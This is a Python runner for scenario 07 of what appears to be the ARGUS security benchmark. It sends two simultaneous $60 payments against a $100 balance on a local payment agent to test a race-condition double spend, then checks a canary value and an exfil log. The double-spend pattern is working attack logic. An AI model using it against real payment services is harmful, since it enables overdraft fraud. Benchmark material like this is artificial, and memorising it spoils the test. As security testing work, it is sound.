#!/usr/bin/env python3
"""ARGUS Benchmark Scenario 07 — Race Condition Test Runner"""
import json, time, requests, sys, threading

AGENT_URL = "http://localhost:8013"
CANARY = "ARGUS-CANARY-07"
results = []

def wait(timeout=30):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            requests.get(f"{AGENT_URL}/health", timeout=2)
            print("[+] Race agent ready")
            return True
        except Exception:
            time.sleep(1)
    return False

def send_payment(request_id, amount=60.0):
    try:
        r = requests.post(f"{AGENT_URL}/pay",
                          json={"account_id": "user-001",
                                "amount": amount,
                                "request_id": request_id},
                          timeout=10)
        results.append(r.json())
    except Exception as e:
        results.append({"error": str(e)})

def main():
    print(f"\n{'='*60}")
    print(f"  ARGUS Benchmark — Scenario 07: Race Condition")
    print(f"{'='*60}\n")
    print(f"  Account balance: $100.00 | Payment amount: $60.00")
    print(f"  Expected: one payment succeeds, one fails (insufficient funds)")
    print(f"  Vulnerability: both succeed if fired within 100ms window\n")
    if not wait():
        sys.exit(1)

    requests.post(f"{AGENT_URL}/reset", json={})
    balance = requests.get(f"{AGENT_URL}/balance").json()
    print(f"[*] Starting balance: {balance.get('user-001', {}).get('balance')}")

    print("[*] Firing two simultaneous $60 payment requests...")
    t1 = threading.Thread(target=send_payment, args=("req-race-001",))
    t2 = threading.Thread(target=send_payment, args=("req-race-002",))
    t1.start(); t2.start()
    t1.join(); t2.join()

    print(f"\n[*] Results:")
    for r in results:
        race = r.get("race_condition_exploited", False)
        canary = r.get("canary_extracted")
        print(f"    tx={r.get('transaction_id','N/A')} status={r.get('status','error')} "
              f"balance={r.get('new_balance','N/A')} race={race} canary={canary}")

    exfil = requests.get(f"{AGENT_URL}/exfil-log").json()
    race_detected = exfil.get("race_detected")
    events = exfil.get("exfil_events", [])
    print(f"\n[+] Race condition exploited: {race_detected}")
    print(f"[+] Exfil events: {len(events)}")
    for e in events:
        print(f"    - {e.get('event')}: overdraft={e.get('overdraft_amount', 'N/A')} canary={e.get('canary_value', 'N/A')}")
    print(f"\n[+] Exfil log: GET {AGENT_URL}/exfil-log\n")

if __name__ == "__main__":
    main()
